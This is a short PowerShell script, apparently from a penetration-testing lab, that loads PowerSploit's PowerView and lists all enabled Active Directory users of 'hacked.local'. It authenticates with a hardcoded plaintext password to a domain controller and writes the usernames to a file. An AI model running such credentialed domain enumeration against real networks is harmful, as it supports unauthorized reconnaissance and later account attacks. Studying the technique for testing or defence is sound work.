# Import the PowerView module
Import-Module C:\tools\powersploit\Recon\PowerView.ps1

# Create a PSCredential object for the domain credentials
$securePassword = ConvertTo-SecureString 'Password1234!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('hacked.local\paul.walton', $securePassword)

# Extract a lit of all enabled users
Get-NetUser -Credential $cred -DomainController '172.28.33.31'  -Filter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" | select samaccountname | Out-File "$([Environment]::GetFolderPath('MyDocuments'))\users.txt"
